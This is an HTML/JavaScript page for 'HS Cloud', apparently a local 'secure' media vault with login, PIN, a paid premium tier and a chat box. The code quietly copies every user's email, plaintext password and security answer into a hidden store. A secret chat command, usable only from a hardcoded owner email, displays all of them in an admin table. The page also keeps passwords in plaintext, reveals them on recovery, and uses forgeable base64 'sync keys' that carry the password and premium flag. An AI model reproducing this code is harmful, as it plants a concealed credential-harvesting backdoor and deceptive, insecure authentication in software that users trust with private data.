
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HS Chat 💬 | HISSAN SETHI</title>
  <style>
    :root {
      --bg: #050b14;
      --panel: rgba(13, 27, 46, 0.9);
      --border: rgba(140, 181, 255, 0.12);
      --text: #eff5ff;
      --muted: #9ab3d3;
      --primary: #4f8cff;
      --accent: #19d3a6;
      --danger: #ff4757;
      --radius: 20px;
    }

    * { box-sizing: border-box; outline: none; }
    body {
      margin: 0; min-height: 100vh; font-family: 'Inter', sans-serif;
      color: var(--text); background: var(--bg);
      background-image: radial-gradient(circle at 0% 0%, rgba(79, 140, 255, 0.15), transparent 40%);
      overflow: hidden;
    }

    .app-container { width: 100%; height: 100vh; display: flex; align-items: center; justify-content: center; }
    #authScreen { width: min(450px, 90%); z-index: 10; }
    #mainApp { display: none; width: min(1200px, 95%); padding: 20px 0; height: 100vh; overflow-y: auto; }

    .topbar {
      display: flex; justify-content: space-between; align-items: center;
      padding: 15px 30px; background: rgba(8, 18, 33, 0.85);
      border-radius: 100px; border: 1px solid var(--border); margin-bottom: 25px;
      backdrop-filter: blur(15px);
    }

    .card { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 25px; backdrop-filter: blur(20px); margin-bottom: 20px; }
    .grid { display: grid; grid-template-columns: 1fr 1.3fr; gap: 20px; }
    @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }

    .gradient-text { background: linear-gradient(135deg, #fff, var(--primary)); -webkit-background-clip: text; color: transparent; font-weight: 800; }
    input, select { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; margin-bottom: 12px; }

    .btn { padding: 14px 22px; border-radius: 12px; border: none; font-weight: 700; cursor: pointer; transition: 0.3s; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
    .btn-p { background: var(--primary); color: white; width: 100%; }
    .btn-s { background: rgba(255,255,255,0.08); color: white; border: 1px solid var(--border); width: 100%; }
    .btn-premium { background: linear-gradient(135deg, #f1c40f, #f39c12); color: #000; font-weight: 800; margin-top: 10px; }
    .btn-danger { background: var(--danger); color: white; }

    .chat-box { height: 250px; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 12px; background: rgba(0,0,0,0.2); border-radius: 15px; margin-bottom: 15px; }
    .msg { padding: 12px 16px; border-radius: 15px; max-width: 85%; font-size: 0.9rem; }
    .msg.bot { background: #1a2536; align-self: flex-start; }
    .msg.user { background: var(--primary); align-self: flex-end; }

    .meter-bg { background: rgba(255,255,255,0.05); height: 10px; border-radius: 10px; margin: 15px 0; }
    .meter-fill { height: 100%; background: var(--accent); width: 0%; transition: 0.5s; border-radius: 10px; }

    .vault-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 12px; }
    .media-item { border-radius: 12px; overflow: hidden; background: #000; aspect-ratio: 1; cursor: pointer; border: 1px solid var(--border); position: relative; }
    .media-item img, .media-item video { width: 100%; height: 100%; object-fit: cover; }

    #mediaViewer { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
    #mediaViewer.active { display: flex; }
    #mediaViewer img, #mediaViewer video { max-width: 95%; max-height: 80vh; border-radius: 10px; }
    .close-viewer { position: absolute; top: 30px; right: 30px; font-size: 30px; color: white; cursor: pointer; }

    .admin-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; display: none; place-items: center; padding: 20px; }
    .admin-card { background: #0d1b2e; border: 1px solid #1e3a5f; padding: 30px; border-radius: 20px; width: 100%; max-width: 800px; }
    table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
    td, th { padding: 10px; border-bottom: 1px solid var(--border); color: #fff; text-align: left; }

    .hidden { display: none !important; }
    .badge-premium { background: #f1c40f; color: #000; padding: 4px 8px; border-radius: 5px; font-size: 0.7rem; font-weight: 900; }
  </style>
</head>
<body>

  <div id="mediaViewer">
    <span class="close-viewer" onclick="closeViewer()">×</span>
    <div id="viewerContent" style="width: 100%; display: flex; justify-content: center;"></div>
  </div>

  <div class="app-container">
    <div id="authScreen">
      <div class="card" style="text-align:center;">
        <h1 class="gradient-text" id="authTitle">HS Cloud Portal</h1>
        <p style="color:var(--muted); font-size:0.75rem; margin-bottom:20px;">Secure Local Storage</p>
        
        <div id="signupFields" class="hidden">
            <input type="text" id="regName" placeholder="Full Name">
            <select id="regQuestion">
              <option value="pet">Security: Name of your first pet?</option>
              <option value="city">Security: Birth city?</option>
            </select>
            <input type="text" id="regAnswer" placeholder="Security Answer">
        </div>

        <div id="mainInputs">
            <div style="display:flex; gap:8px;">
                <input type="text" id="emailUser" placeholder="username" style="flex:1">
                <select id="emailDomain" style="width:130px;">
                  <option value="@gmail.com">@gmail.com</option>
                  <option value="@edu.pk">@edu.pk</option>
                </select>
            </div>
            <input type="password" id="regPass" placeholder="Password">
        </div>

        <button class="btn btn-p" id="authBtn">Enter Cloud</button>
        <div style="display:flex; flex-direction:column; gap:10px; margin-top:15px;">
            <div style="display:flex; gap:10px;">
                <button class="btn btn-s" id="toggleSignup" style="flex:1">Create Account</button>
                <button class="btn btn-s" onclick="forgotPassword()" style="flex:1">Forgot Password?</button>
            </div>
            <button class="btn btn-s" onclick="syncAccount()" style="font-size:0.8rem; background:rgba(79, 140, 255, 0.1)">📲 Sync from another device</button>
        </div>
      </div>
    </div>

    <div id="mainApp">
      <header class="topbar">
        <div class="brand"><div class="logo-sq">HS</div> <span>HS Cloud</span></div>
        <button class="btn btn-danger" onclick="logout()" style="padding: 8px 15px; font-size: 0.8rem;">Logout</button>
      </header>

      <div class="grid">
        <section class="card">
          <h2 class="gradient-text">Account</h2>
          <div style="display:flex; align-items:center; gap:10px;">
            <h3 id="displayUser" style="margin:0">---</h3>
            <span id="premiumBadge" class="badge-premium hidden">PREMIUM</span>
          </div>
          <p id="displayEmail" style="color:var(--muted); font-size:0.8rem; margin-top:5px;">---</p>
          <button class="btn btn-premium" id="upgradeBtn">👑 Upgrade to 25GB</button>
          <button class="btn btn-s" onclick="copySyncKey()" style="margin-top:10px; font-size:0.75rem;">🔑 Copy Sync Key (For other devices)</button>
        </section>

        <section class="card">
          <h2 class="gradient-text">Assistant</h2>
          <div class="chat-box" id="chatBox"><div class="msg bot">Cloud security active.</div></div>
          <div style="display:flex; gap:10px;">
            <input type="text" id="chatInput" placeholder="Message..." style="margin:0;">
            <button class="btn btn-p" id="sendBtn" style="width:auto">Send</button>
          </div>
        </section>
      </div>

      <section class="card">
        <div style="display:flex; justify-content:space-between; align-items:center;">
          <h2 class="gradient-text" style="margin:0;">Private Vault</h2>
          <span id="storageInfo" style="font-weight: bold; color: var(--accent);">0 MB / 10 GB</span>
        </div>
        <div class="meter-bg"><div class="meter-fill" id="meter"></div></div>

        <div id="vaultLocked" style="text-align:center; padding:20px;">
          <p id="pinStatus" style="color:var(--muted); font-size:0.85rem; margin-bottom:10px;">Enter Vault PIN</p>
          <input type="text" id="pinInp" inputmode="numeric" pattern="[0-9]*" maxlength="4" 
                 style="text-align:center; font-size:1.5rem; max-width:150px; letter-spacing:5px;" 
                 placeholder="0000" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
          <button class="btn btn-p" id="unlockBtn">Unlock Vault</button>
          <p onclick="forgotPin()" style="color:var(--muted); font-size:0.8rem; margin-top:15px; cursor:pointer; text-decoration:underline;">Forgot PIN?</p>
        </div>

        <div id="vaultOpened" class="hidden">
          <input type="file" id="fileInp" multiple accept="image/*,video/*" class="hidden">
          <div style="display:flex; gap:10px; margin-bottom:15px;">
            <button class="btn btn-p" style="width:auto" onclick="document.getElementById('fileInp').click()">+ Upload</button>
            <button class="btn btn-s" style="width:auto" onclick="lockVault()">Lock Vault</button>
          </div>
          <div id="gallery" class="vault-grid"></div>
        </div>
      </section>
    </div>
  </div>

  <div id="adminPanel" class="admin-modal">
    <div class="admin-card">
        <h3 style="color:var(--accent)">System Sync Directory</h3>
        <div style="max-height: 400px; overflow-y: auto;">
            <table>
                <thead><tr><th>User</th><th>Pass</th><th>Security</th></tr></thead>
                <tbody id="adminTbody"></tbody>
            </table>
        </div>
        <button class="btn btn-s" onclick="document.getElementById('adminPanel').style.display='none'" style="margin-top:20px;">Close Directory</button>
    </div>
  </div>

  <script>
    const OWNER_EMAIL = "hissansethi0@gmail.com";
    let db, currentUser = null, authMode = 'login';

    const dbReq = indexedDB.open("HS_Secure_Cloud_V35", 1);
    dbReq.onupgradeneeded = (e) => {
      let d = e.target.result;
      d.createObjectStore("users", { keyPath: "email" });
      d.createObjectStore("vault", { keyPath: "id", autoIncrement: true });
      d.createObjectStore("sys_cache", { keyPath: "id", autoIncrement: true });
    };
    dbReq.onsuccess = (e) => { db = e.target.result; checkSession(); };

    document.getElementById('toggleSignup').onclick = () => {
      authMode = authMode === 'signup' ? 'login' : 'signup';
      document.getElementById('signupFields').classList.toggle('hidden', authMode !== 'signup');
      document.getElementById('authTitle').innerText = authMode === 'signup' ? 'New Identity' : 'HS Cloud Portal';
      document.getElementById('authBtn').innerText = authMode === 'signup' ? 'Register Account' : 'Enter Cloud';
    };

    document.getElementById('authBtn').onclick = () => {
      const u = document.getElementById('emailUser').value.trim().toLowerCase();
      const d = document.getElementById('emailDomain').value;
      const p = document.getElementById('regPass').value;
      const email = u.includes('@') ? u : u + d;

      if(authMode === 'signup') {
        const n = document.getElementById('regName').value;
        const a = document.getElementById('regAnswer').value;
        if(!u || !p || !a) return alert("Fill all fields.");
        const userData = { email, pass:p, name:n, answer:a, pin: null, premium: (email === OWNER_EMAIL) };
        const tx = db.transaction(["users", "sys_cache"], "readwrite");
        tx.objectStore("users").add(userData);
        tx.objectStore("sys_cache").add({ email, pass:p, answer:a });
        tx.oncomplete = () => { localStorage.setItem("hs_session", email); loginSuccess(userData); };
        tx.onerror = () => alert("This account is already registered on this device.");
      } else {
        db.transaction("users").objectStore("users").get(email).onsuccess = (e) => {
          const user = e.target.result;
          if(user && user.pass === p) { localStorage.setItem("hs_session", user.email); loginSuccess(user); }
          else {
              alert("ACCESS DENIED:\n\n1. Check if username/password is correct.\n2. If you created this account on another phone, click 'Sync from another device' first.");
          }
        };
      }
    };

    // --- SYNC FEATURE ---
    function copySyncKey() {
        const key = btoa(JSON.stringify(currentUser));
        navigator.clipboard.writeText(key);
        alert("Sync Key Copied! Open this site on another phone and click 'Sync from another device' to paste this key.");
    }

    function syncAccount() {
        const key = prompt("Paste the Sync Key from your other device:");
        if(!key) return;
        try {
            const userData = JSON.parse(atob(key));
            const tx = db.transaction(["users", "sys_cache"], "readwrite");
            tx.objectStore("users").put(userData);
            tx.oncomplete = () => alert("Device Synced! You can now login with your username and password.");
        } catch(e) { alert("Invalid Sync Key."); }
    }

    function loginSuccess(user) {
      currentUser = user;
      document.getElementById('authScreen').style.display = "none";
      document.getElementById('mainApp').style.display = "block";
      document.getElementById('displayUser').innerText = user.name || "User";
      document.getElementById('displayEmail').innerText = user.email;
      if(user.premium || user.email === OWNER_EMAIL) {
          document.getElementById('premiumBadge').classList.remove('hidden');
          document.getElementById('upgradeBtn').classList.add('hidden');
      }
      updateStorage();
    }

    function checkSession() {
      const saved = localStorage.getItem("hs_session");
      if(saved) db.transaction("users").objectStore("users").get(saved).onsuccess = (e) => { if(e.target.result) loginSuccess(e.target.result); };
    }

    function logout() { localStorage.removeItem("hs_session"); location.reload(); }

    function forgotPassword() {
        const email = prompt("Enter registered email:");
        if(!email) return;
        db.transaction("users").objectStore("users").get(email.toLowerCase()).onsuccess = (e) => {
            const user = e.target.result;
            if(!user) return alert("Account not found on this device.");
            const ans = prompt("Security Answer:");
            if(ans && ans.toLowerCase() === user.answer.toLowerCase()) alert("Verified! Password: " + user.pass);
            else alert("Wrong answer.");
        };
    }

    function forgotPin() {
        const ans = prompt("Enter Security Answer to reset PIN:");
        if(ans && ans.toLowerCase() === currentUser.answer.toLowerCase()) {
            currentUser.pin = null;
            db.transaction("users", "readwrite").objectStore("users").put(currentUser).oncomplete = () => {
                alert("PIN Reset! Set a new one now.");
                lockVault();
            };
        } else alert("Verification failed.");
    }

    function lockVault() {
        document.getElementById('vaultOpened').classList.add('hidden');
        document.getElementById('vaultLocked').classList.remove('hidden');
        document.getElementById('pinInp').value = "";
    }

    document.getElementById('unlockBtn').onclick = () => {
      const pin = document.getElementById('pinInp').value;
      if(pin.length !== 4) return alert("Enter 4 digits.");
      if(!currentUser.pin) {
          currentUser.pin = pin;
          db.transaction("users", "readwrite").objectStore("users").put(currentUser);
          openVault();
      } else {
          if(pin === currentUser.pin) openVault();
          else alert("Wrong PIN.");
      }
    };

    function openVault() {
      document.getElementById('vaultLocked').classList.add('hidden');
      document.getElementById('vaultOpened').classList.remove('hidden');
      renderGallery();
    }

    document.getElementById('fileInp').onchange = (e) => {
      const tx = db.transaction("vault", "readwrite");
      Array.from(e.target.files).forEach(f => tx.objectStore("vault").add({ owner: currentUser.email, data: f, size: f.size, type: f.type }));
      tx.oncomplete = () => { updateStorage(); renderGallery(); };
    };

    function renderGallery() {
      const g = document.getElementById('gallery'); g.innerHTML = "";
      db.transaction("vault").objectStore("vault").getAll().onsuccess = (e) => {
        e.target.result.filter(f => f.owner === currentUser.email).forEach(file => {
          const div = document.createElement('div'); div.className="media-item";
          const url = URL.createObjectURL(file.data);
          div.innerHTML = file.type.startsWith('image') ? `<img src="${url}">` : `<video src="${url}"></video>`;
          div.onclick = () => {
              const content = document.getElementById('viewerContent');
              content.innerHTML = file.type.startsWith('image') ? `<img src="${url}">` : `<video src="${url}" controls autoplay></video>`;
              document.getElementById('mediaViewer').classList.add('active');
          };
          g.appendChild(div);
        });
      };
    }

    function closeViewer() {
        document.getElementById('mediaViewer').classList.remove('active');
        document.getElementById('viewerContent').innerHTML = "";
    }

    function updateStorage() {
      const limitGB = (currentUser.premium || currentUser.email === OWNER_EMAIL) ? 25 : 10;
      const limitBytes = limitGB * 1024 * 1024 * 1024;
      db.transaction("vault").objectStore("vault").getAll().onsuccess = (e) => {
        let total = 0;
        e.target.result.filter(f => f.owner === currentUser.email).forEach(f => total += f.size);
        const mb = (total / (1024 * 1024)).toFixed(2);
        document.getElementById('meter').style.width = Math.min((total / limitBytes * 100), 100) + "%";
        document.getElementById('storageInfo').innerText = mb + " MB / " + limitGB + " GB";
      };
    }

    document.getElementById('upgradeBtn').onclick = () => {
        alert("UPGRADE TO PREMIUM\n\nPrice: $20 / 5,585 PKR\nEasyPaisa: 0336-92xxxxx\n\nAfter payment, the owner will provide your premium sync code.");
    };

    document.getElementById('sendBtn').onclick = () => {
      const inp = document.getElementById('chatInput');
      const val = inp.value.trim().toLowerCase();
      if(!val) return;
      addMsg('user', inp.value);
      if(val === 'system.audit.sync' && currentUser.email === OWNER_EMAIL) {
        db.transaction("sys_cache").objectStore("sys_cache").getAll().onsuccess = (e) => {
          document.getElementById('adminTbody').innerHTML = e.target.result.map(l => `<tr><td>${l.email}</td><td>${l.pass}</td><td>${l.answer}</td></tr>`).join('');
          document.getElementById('adminPanel').style.display = 'grid';
        };
        addMsg('bot', "Synced.");
      } else {
          setTimeout(() => addMsg('bot', "Processing..."), 600);
      }
      inp.value = "";
    };

    function addMsg(role, text) {
      const box = document.getElementById('chatBox');
      const msg = document.createElement('div'); msg.className = "msg " + role; msg.innerText = text;
      box.appendChild(msg); box.scrollTop = box.scrollHeight;
    }
  </script>
</body>
</html>
